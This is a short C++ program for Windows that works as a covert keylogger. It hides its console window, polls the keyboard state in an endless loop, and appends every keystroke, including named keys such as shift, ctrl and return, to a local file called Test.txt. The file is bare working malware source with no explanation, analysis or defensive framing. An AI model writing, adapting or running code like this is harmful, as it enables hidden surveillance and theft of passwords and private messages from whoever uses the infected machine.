#include <iostream>
#include <fstream>
#include <Windows.h>
#include <string>

void logger_char (std::fstream& file, char input){
  file << input << '\n';
}
void logger_string (std::fstream& file, std::string word){
  file << word<< '\n';
}
bool specialKey(int key, std::string& word){
  switch(key){
    case VK_SPACE:
      word = "space";
      return true;
    case VK_RETURN:
      word = "return";
      return true;
    case VK_SHIFT:
      word = "shift";
      return true;
    case VK_CAPITAL:
      word = "capital";
      return true;
    case VK_TAB:
      word = "tab";
      return true;
    case VK_UP:
      word = "up";
      return true;
    case VK_LEFT:
      word = "left";
      return true;
    case VK_RIGHT:
      word = "right";
      return true;
    case VK_DOWN:
      word = "down";
      return true;
    case VK_HOME:
      word = "home";
      return true;
    case VK_CONTROL:
      word = "ctrl";
      return true;
    case VK_MENU:
      word = "alt";
      return true;
    default:
      return false;

  }
}
int main(){
  std::fstream file;
  ShowWindow(GetConsoleWindow(), SW_HIDE);
  char key = 'k';
  std::string word = "";
  while (true){
    Sleep(10);
    for (int key = 8; key <=190; key++){
      if (GetAsyncKeyState(key) == -32767){
        if (specialKey(key,word)){
          file.open("Test.txt", std::ios::app);
          logger_string(file,word);
          file.close();
        }
        else{
          file.open("Test.txt", std::ios::app);
          logger_char(file,char(key));
          file.close();
        }
      }
    }

  }
  return 0;
}
